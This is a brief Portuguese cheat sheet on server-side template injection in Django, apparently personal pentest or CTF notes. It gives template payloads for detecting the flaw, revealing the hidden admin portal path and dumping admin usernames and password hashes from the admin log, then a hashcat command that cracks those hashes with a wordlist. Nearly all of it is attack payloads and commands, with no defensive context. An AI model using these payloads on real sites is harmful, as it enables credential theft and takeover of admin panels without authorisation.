# Injeção de Modelo no Servidor

**Detecção:** `{% if 'ahsan' == 'ahsan' %} a {% endif %}`

**Depuração:** `{% debug %}`

**Divulgando Portal do Admin:** `{% include 'admin/base.html' %}` <mark style="color:green;">= /secret-admin-portal</mark>



**Divulgando Credenciais:**

<pre><code>{% load log %} {% get_admin_log 10 <a data-footnote-ref href="#user-content-fn-1">as</a> log %} {% for e in log %}
{{e.user.get username}} : {{e.user.password}} {% endfor %}
</code></pre>



**Credenciais com hash do Django Descartadas**



**Descriptografado usando Hashcat:**&#x20;

`hashcat -m 10000 hashed_passwords rockyou. txt` <mark style="color:green;">= Django Admin Panel Pwn</mark>

[^1]: 
